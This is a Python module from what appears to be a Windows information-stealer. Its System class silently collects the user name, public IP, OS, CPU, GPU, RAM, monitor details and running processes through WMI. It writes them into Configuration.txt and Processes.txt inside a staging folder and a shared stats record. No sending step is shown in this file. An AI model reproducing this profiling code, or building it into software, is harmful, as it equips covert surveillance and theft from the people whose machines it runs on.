from os import mkdir
from multiprocessing import Process
from urllib.request import Request, urlopen

from win32com.client import GetObject
from win32api import EnumDisplayMonitors, GetMonitorInfo

from ..utils.config import SystemConfig, pc_stats

class System(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = SystemConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def _create_folder(self):

        if any(self.statuses):
            mkdir(rf"{self.storage_path}\{self.folder}")

    def _get_system_info(self):

        if self.statuses[1] is True:

            win = GetObject("winmgmts:root\\cimv2")

            data = self.config.SystemData
            os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
            cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
            gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
            monitors_info = ", ".join(f"{monitor['Device'][4:]} {monitor['Monitor'][2]}x{monitor['Monitor'][3]}" for monitor in [GetMonitorInfo(monitor[0]) for monitor in EnumDisplayMonitors()])

            try:
                net_info = urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
            except:
                net_info = "Error"

            pc_stats['name'] = str(self.config.User)
            pc_stats['ip'] = str(net_info)
            pc_stats['os_name'] = str(os_info.Name.split('|')[0])
            pc_stats['os_version'] = str(os_info.Version)
            pc_stats['cpu'] = str(cpu_info)
            pc_stats['gpu'] = str(gpu_info)
            pc_stats['ram'] = str(round(float(os_info.TotalVisibleMemorySize) / 1048576))


            with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:

                system.write(data.format(
                    self.config.User,
                    net_info,
                    os_info.Name.split('|')[0],
                    os_info.Version,
                    os_info.BuildNumber,
                    monitors_info,
                    cpu_info,
                    gpu_info,
                    round(float(os_info.TotalVisibleMemorySize) / 1048576)
                ))

    def _get_system_processes(self):

        if self.statuses[2] is True:

            results = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]

            with open(rf"{self.storage_path}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
                processes.write("\n".join(result for result in list(set(results))))

    def run(self):

        try:

            self._create_folder()
            self._get_system_info()
            self._get_system_processes()

        except Exception as e:
            if self.errors is True: print(f"[System]: {repr(e)}")
